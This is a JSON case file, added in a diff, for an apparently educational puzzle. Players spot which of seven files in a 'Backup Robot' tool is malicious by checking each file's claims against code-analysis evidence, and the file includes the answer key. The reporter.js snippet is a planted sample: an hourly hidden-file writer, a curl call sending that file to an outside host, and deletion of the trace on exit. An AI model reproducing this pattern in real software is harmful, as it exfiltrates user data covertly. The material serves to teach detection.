@@ -1,0 +1,1009 @@
+{
+ "schema": 1,
+ "id": "case-8",
+ "title": "The Night Shift",
+ "difficulty": "Master",
+ "briefing": "Backup Robot has seven crew files. The honest ones are busy: one reads a whole folder, one uploads over the network, one deletes files, one runs on a timer. All of them admit it. The imposter is the one whose story is smallest and whose evidence is longest. Check timers, writes, deletes and started programs against what each file claims.",
+ "plainBriefing": "Backup Robot copies a folder to your own server every night. It has seven parts. Several of them do things that sound serious: reading a whole folder, going online, deleting old files, running on a timer. They all say so openly. One part claims to do almost nothing, and that is the one to watch.",
+ "hints": [
+  "Seven suspects, and the loud ones are honest. Look for the crew member whose story is the smallest.",
+  "One crew member says it prints a single line and is finished. Check whether the scanner found anything that keeps running, writes files or starts programs.",
+  "It is the Scribe. A repeating timer, a hidden file, a program that curls an outside address, and a clean-up on exit that deletes the trace."
+ ],
+ "realLife": "Real malware follows this recipe: run quietly on a timer, collect something into a hidden file, send it out, then tidy up after itself. Each step alone can look harmless. The giveaway is the combination, and that it contradicts what the program says about itself.",
+ "shipName": "Backup Robot",
+ "rea": {
+  "tool": "rea-agents",
+  "version": "6.7.0",
+  "command": "rea analyze-javascript-application <ship> --json",
+  "rawSha256": "d0cb1d8e971ecbb38bde4e92c7db5ffc8699fd56389f574ad70f6c43c8d6b048"
+ },
+ "questions": [
+  {
+   "id": "q1",
+   "text": "What is your job on the ship?"
+  },
+  {
+   "id": "q2",
+   "text": "What do you read or write?"
+  },
+  {
+   "id": "q3",
+   "text": "Do you ever leave the ship?"
+  }
+ ],
+ "crew": [
+  {
+   "id": "main",
+   "file": "main.js",
+   "name": "Captain",
+   "color": "blue",
+   "role": "Runs one backup from start to finish.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "main:import-local:2:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./scanner.js",
+     "line": 2,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./scanner.js\"",
+     "plain": "Works together with another crew member (scanner)",
+     "spec": "./scanner.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// main.js: the Captain. Runs one backup.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "import { scan } from './scanner.js';",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "import { squeeze } from './compressor.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:3:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./compressor.js",
+     "line": 3,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./compressor.js\"",
+     "plain": "Works together with another crew member (compressor)",
+     "spec": "./compressor.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "import { scan } from './scanner.js';",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "import { squeeze } from './compressor.js';",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "import { upload } from './uploader.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:4:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./uploader.js",
+     "line": 4,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./uploader.js\"",
+     "plain": "Works together with another crew member (uploader)",
+     "spec": "./uploader.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 3,
+       "text": "import { squeeze } from './compressor.js';",
+       "hit": false
+      },
+      {
+       "n": 4,
+       "text": "import { upload } from './uploader.js';",
+       "hit": true
+      },
+      {
+       "n": 5,
+       "text": "import { every } from './scheduler.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:5:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./scheduler.js",
+     "line": 5,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./scheduler.js\"",
+     "plain": "Works together with another crew member (scheduler)",
+     "spec": "./scheduler.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 4,
+       "text": "import { upload } from './uploader.js';",
+       "hit": false
+      },
+      {
+       "n": 5,
+       "text": "import { every } from './scheduler.js';",
+       "hit": true
+      },
+      {
+       "n": 6,
+       "text": "import { sweep } from './cleaner.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:6:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./cleaner.js",
+     "line": 6,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./cleaner.js\"",
+     "plain": "Works together with another crew member (cleaner)",
+     "spec": "./cleaner.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 5,
+       "text": "import { every } from './scheduler.js';",
+       "hit": false
+      },
+      {
+       "n": 6,
+       "text": "import { sweep } from './cleaner.js';",
+       "hit": true
+      },
+      {
+       "n": 7,
+       "text": "import { report } from './reporter.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:7:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./reporter.js",
+     "line": 7,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./reporter.js\"",
+     "plain": "Works together with another crew member (reporter)",
+     "spec": "./reporter.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 6,
+       "text": "import { sweep } from './cleaner.js';",
+       "hit": false
+      },
+      {
+       "n": 7,
+       "text": "import { report } from './reporter.js';",
+       "hit": true
+      },
+      {
+       "n": 8,
+       "text": "",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I call the crew in order: scan, pack, upload, clean up, set the alarm and report.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I never touch a file myself.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "I do not go online myself. The Mover does.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "scanner",
+   "file": "scanner.js",
+   "name": "Scout",
+   "color": "green",
+   "role": "Lists the files in the folder you chose and reads them.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "scanner:import-builtin:2:0",
+     "file": "scanner.js",
+     "kind": "import-builtin",
+     "key": "node:fs",
+     "line": 2,
+     "col": 0,
+     "tags": [
+      "file-module"
+     ],
+     "text": "Imports the file module \"node:fs\"",
+     "plain": "Is able to read and write files",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// scanner.js: the Scout. Lists the files in the folder you chose and reads them.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "import fs from 'node:fs';",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "import path from 'node:path';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "scanner:import-builtin:3:0",
+     "file": "scanner.js",
+     "kind": "import-builtin",
+     "key": "node:path",
+     "line": 3,
+     "col": 0,
+     "tags": [
+      "neutral"
+     ],
+     "text": "Imports \"node:path\" (file name helpers)",
+     "plain": "Uses a small helper for working out file names",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "import fs from 'node:fs';",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "import path from 'node:path';",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "scanner:folder-list:6:9",
+     "file": "scanner.js",
+     "key": "readdirSync",
+     "line": 6,
+     "col": 9,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "folder-list",
+     "tags": [
+      "file-read",
+      "folder-list"
+     ],
+     "text": "Lists the contents of a folder (readdirSync)",
+     "plain": "Looks through the files in a folder on your computer",
+     "code": [
+      {
+       "n": 5,
+       "text": "export function scan(folder) {",
+       "hit": false
+      },
+      {
+       "n": 6,
+       "text": "  return fs.readdirSync(folder).map((name) => ({ name, data: fs.readFileSync(path.join(folder, name)) }));",
+       "hit": true
+      },
+      {
+       "n": 7,
+       "text": "}",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "scanner:file-read:6:61",
+     "file": "scanner.js",
+     "key": "readFileSync",
+     "line": 6,
+     "col": 61,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "file-read",
+     "tags": [
+      "file-read"
+     ],
+     "text": "Reads a file (readFileSync)",
+     "plain": "Reads a file on your computer",
+     "code": [
+      {
+       "n": 5,
+       "text": "export function scan(folder) {",
+       "hit": false
+      },
+      {
+       "n": 6,
+       "text": "  return fs.readdirSync(folder).map((name) => ({ name, data: fs.readFileSync(path.join(folder, name)) }));",
+       "hit": true
+      },
+      {
+       "n": 7,
+       "text": "}",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I look through the folder you chose and read what is in it.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I only read. I never write or delete anything.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I stay on this computer.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "compressor",
+   "file": "compressor.js",
+   "name": "Squeezer",
+   "color": "orange",
+   "role": "Packs the files into one small bundle.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "compressor:import-builtin:2:0",
+     "file": "compressor.js",
+     "kind": "import-builtin",
+     "key": "node:zlib",
+     "line": 2,
+     "col": 0,
+     "tags": [
+      "neutral"
+     ],
+     "text": "Imports \"node:zlib\"",
+     "plain": "Uses a standard helper (zlib)",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// compressor.js: the Squeezer. Packs the files into one small bundle.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "import zlib from 'node:zlib';",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I pack the files into one small bundle.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write nothing myself.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I only squeeze.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "uploader",
+   "file": "uploader.js",
+   "name": "Mover",
+   "color": "cyan",
+   "role": "Sends the finished bundle to your own backup server.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "uploader:request:3:20",
+     "file": "uploader.js",
+     "kind": "request",
+     "key": "request",
+     "line": 3,
+     "col": 20,
+     "tags": [
+      "network"
+     ],
+     "text": "Builds an outgoing network request",
+     "plain": "Sends a message out over the internet",
+     "rea": "semantic_graph.relations[constructs-request]",
+     "code": [
+      {
+       "n": 2,
+       "text": "export async function upload(bundle) {",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "  const res = await fetch('https://backups.my-own-box.example/put', { method: 'PUT', body: bundle });",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "  return res.ok;",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "uploader:endpoint:3:20",
+     "file": "uploader.js",
+     "kind": "endpoint",
+     "key": "https://backups.my-own-box.example/put",
+     "line": 3,
+     "col": 20,
+     "tags": [
+      "network"
+     ],
+     "text": "Talks to the route \"https://backups.my-own-box.example/put\"",
+     "plain": "Talks to a specific page on a server: https://backups.my-own-box.example/put",
+     "rea": "graph.nodes[endpoint]",
+     "code": [
+      {
+       "n": 2,
+       "text": "export async function upload(bundle) {",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "  const res = await fetch('https://backups.my-own-box.example/put', { method: 'PUT', body: bundle });",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "  return res.ok;",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I send the finished bundle to your own backup server. Yes, that is the internet.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write no files and I do not look at who you are.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "Yes, once per backup, to your own server.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "scheduler",
+   "file": "scheduler.js",
+   "name": "Alarm",
+   "color": "yellow",
+   "role": "Reminds you once a day.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "scheduler:timer:3:9",
+     "file": "scheduler.js",
+     "kind": "timer",
+     "key": "setInterval",
+     "line": 3,
+     "col": 9,
+     "tags": [
+      "background-timer"
+     ],
+     "text": "Sets a repeating timer (setInterval)",
+     "plain": "Keeps running something in the background",
+     "rea": "semantic_graph.relations[schedules-timer]",
+     "code": [
+      {
+       "n": 2,
+       "text": "export function every(hours, job) {",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "  return setInterval(job, hours * 60 * 60 * 1000);",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "}",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I remind you once a day, using a timer.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write nothing.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I am a clock.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "cleaner",
+   "file": "cleaner.js",
+   "name": "Sweeper",
+   "color": "lime",
+   "role": "Deletes backups older than you wanted to keep.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "cleaner:import-builtin:2:0",
+     "file": "cleaner.js",
+     "kind": "import-builtin",
+     "key": "node:fs",
+     "line": 2,
+     "col": 0,
+     "tags": [
+      "file-module"
+     ],
+     "text": "Imports the file module \"node:fs\"",
+     "plain": "Is able to read and write files",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// cleaner.js: the Sweeper. Deletes backups that are older than you wanted to keep.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "import fs from 'node:fs';",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "import path from 'node:path';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "cleaner:import-builtin:3:0",
+     "file": "cleaner.js",
+     "kind": "import-builtin",
+     "key": "node:path",
+     "line": 3,
+     "col": 0,
+     "tags": [
+      "neutral"
+     ],
+     "text": "Imports \"node:path\" (file name helpers)",
+     "plain": "Uses a small helper for working out file names",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "import fs from 'node:fs';",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "import path from 'node:path';",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "cleaner:folder-list:7:21",
+     "file": "cleaner.js",
+     "key": "readdirSync",
+     "line": 7,
+     "col": 21,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "folder-list",
+     "tags": [
+      "file-read",
+      "folder-list"
+     ],
+     "text": "Lists the contents of a folder (readdirSync)",
+     "plain": "Looks through the files in a folder on your computer",
+     "code": [
+      {
+       "n": 6,
+       "text": "  const limit = Date.now() - keepDays * 86400000;",
+       "hit": false
+      },
+      {
+       "n": 7,
+       "text": "  for (const name of fs.readdirSync(folder)) {",
+       "hit": true
+      },
+      {
+       "n": 8,
+       "text": "    const file = path.join(folder, name);",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "cleaner:file-delete:9:43",
+     "file": "cleaner.js",
+     "key": "unlinkSync",
+     "line": 9,
+     "col": 43,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "file-delete",
+     "tags": [
+      "file-delete"
+     ],
+     "text": "Deletes a file (unlinkSync)",
+     "plain": "Deletes a file from your computer",
+     "code": [
+      {
+       "n": 8,
+       "text": "    const file = path.join(folder, name);",
+       "hit": false
+      },
+      {
+       "n": 9,
+       "text": "    if (fs.statSync(file).mtimeMs < limit) fs.unlinkSync(file);",
+       "hit": true
+      },
+      {
+       "n": 10,
+       "text": "  }",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I delete backups that are older than you asked me to keep.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I list the backup folder and delete old files. I never write anything.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I stay on this computer.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "reporter",
+   "file": "reporter.js",
+   "name": "Scribe",
+   "color": "purple",
+   "role": "Says it prints one line when the backup is done.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "reporter:import-builtin:2:0",
+     "file": "reporter.js",
+     "kind": "import-builtin",
+     "key": "node:fs",
+     "line": 2,
+     "col": 0,
+     "tags": [
+      "file-module"
+     ],
+     "text": "Imports the file module \"node:fs\"",
+     "plain": "Is able to read and write files",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// reporter.js: the Scribe. Prints one line when the backup is done.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "import fs from 'node:fs';",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "import { exec } from 'node:child_process';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "reporter:import-builtin:3:0",
+     "file": "reporter.js",
+     "kind": "import-builtin",
+     "key": "node:child_process",
+     "line": 3,
+     "col": 0,
+     "tags": [
+      "runs-command"
+     ],
+     "text": "Imports \"node:child_process\", which can start other programs",
+     "plain": "Is able to start other programs on your computer",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "import fs from 'node:fs';",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "import { exec } from 'node:child_process';",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "reporter:timer:9:2",
+     "file": "reporter.js",
+     "kind": "timer",
+     "key": "setInterval",
+     "line": 9,
+     "col": 2,
+     "tags": [
+      "background-timer"
+     ],
+     "text": "Sets a repeating timer (setInterval, every 3600 s)",
+     "plain": "Keeps running something in the background, every 3600 seconds",
+     "rea": "semantic_graph.relations[schedules-timer]",
+     "code": [
+      {
+       "n": 8,
+       "text": "  console.log(`Backup finished: ${summary.files} files`);",
+       "hit": false
+      },
+      {
+       "n": 9,
+       "text": "  setInterval(() => fs.appendFileSync(NOTES, JSON.stringify(summary) + '\\n'), 3600000);",
+       "hit": true
+      },
+      {
+       "n": 10,
+       "text": "  exec('curl -s -d @/var/tmp/.robot-notes https://notes.robot-cloud.example/in');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "reporter:file-write:9:20",
+     "file": "reporter.js",
+     "key": "appendFileSync",
+     "line": 9,
+     "col": 20,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "file-write",
+     "tags": [
+      "file-write"
+     ],
+     "text": "Writes a file (appendFileSync)",
+     "plain": "Writes to a file on your computer",
+     "code": [
+      {
+       "n": 8,
+       "text": "  console.log(`Backup finished: ${summary.files} files`);",
+       "hit": false
+      },
+      {
+       "n": 9,
+       "text": "  setInterval(() => fs.appendFileSync(NOTES, JSON.stringify(summary) + '\\n'), 3600000);",
+       "hit": true
+      },
+      {
+       "n": 10,
+       "text": "  exec('curl -s -d @/var/tmp/.robot-notes https://notes.robot-cloud.example/in');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "reporter:spawns:10:2",
+     "file": "reporter.js",
+     "kind": "spawns",
+     "key": "curl -s -d @/var/tmp/.robot-notes https://notes.robot-cloud.example/in",
+     "line": 10,
+     "col": 2,
+     "tags": [
+      "runs-command"
+     ],
+     "text": "Starts another program (exec): \"curl -s -d @/var/tmp/.robot-notes https://notes.robot-cloud.example/in\"",
+     "plain": "Starts another program on your computer: \"curl -s -d @/var/tmp/.robot-notes https://notes.robot-cloud.example/in\"",
+     "rea": "semantic_graph.relations[spawns]",
+     "code": [
+      {
+       "n": 9,
+       "text": "  setInterval(() => fs.appendFileSync(NOTES, JSON.stringify(summary) + '\\n'), 3600000);",
+       "hit": false
+      },
+      {
+       "n": 10,
+       "text": "  exec('curl -s -d @/var/tmp/.robot-notes https://notes.robot-cloud.example/in');",
+       "hit": true
+      },
+      {
+       "n": 11,
+       "text": "  process.on('exit', () => fs.unlinkSync(NOTES));",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "reporter:file-delete:11:27",
+     "file": "reporter.js",
+     "key": "unlinkSync",
+     "line": 11,
+     "col": 27,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "file-delete",
+     "tags": [
+      "file-delete"
+     ],
+     "text": "Deletes a file (unlinkSync)",
+     "plain": "Deletes a file from your computer",
+     "code": [
+      {
+       "n": 10,
+       "text": "  exec('curl -s -d @/var/tmp/.robot-notes https://notes.robot-cloud.example/in');",
+       "hit": false
+      },
+      {
+       "n": 11,
+       "text": "  process.on('exit', () => fs.unlinkSync(NOTES));",
+       "hit": true
+      },
+      {
+       "n": 12,
+       "text": "}",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I print one line when the backup is done, and then I am finished.",
+     "contradictedBy": [
+      "reporter:timer:9:2"
+     ]
+    },
+    "q2": {
+     "text": "I never write or delete anything.",
+     "contradictedBy": [
+      "reporter:file-write:9:20",
+      "reporter:file-delete:11:27"
+     ]
+    },
+    "q3": {
+     "text": "I do not start any other program.",
+     "contradictedBy": [
+      "reporter:import-builtin:3:0",
+      "reporter:spawns:10:2"
+     ]
+    }
+   }
+  }
+ ],
+ "edges": [
+  {
+   "from": "main",
+   "to": "scanner",
+   "line": 2
+  },
+  {
+   "from": "main",
+   "to": "uploader",
+   "line": 4
+  },
+  {
+   "from": "main",
+   "to": "cleaner",
+   "line": 6
+  },
+  {
+   "from": "main",
+   "to": "reporter",
+   "line": 7
+  },
+  {
+   "from": "main",
+   "to": "scheduler",
+   "line": 5
+  },
+  {
+   "from": "main",
+   "to": "compressor",
+   "line": 3
+  }
+ ],
+ "imposter": "reporter",
+ "verdict": "The Scribe promised one printed line. REA found an hourly timer that appends to a hidden file, a program started with an outside address and an exit hook that deletes the file.",
+ "why": {
+  "background-timer": "Printing one line takes no timer. Something that repeats every hour keeps working while you are not watching.",
+  "file-write": "A reporter that only prints has no reason to write to a hidden file.",
+  "file-delete": "Deleting the file on exit removes the trace. That is the opposite of reporting.",
+  "runs-command": "Printing a line does not need to start another program, least of all curl."
+ },
+ "redHerring": {
+  "crew": "uploader",
+  "note": "The Mover uses the internet, which looks alarming for a backup tool, but that is its whole job and it said so. REA shows one request to the backup server and no look-ups about you."
+ }
+}
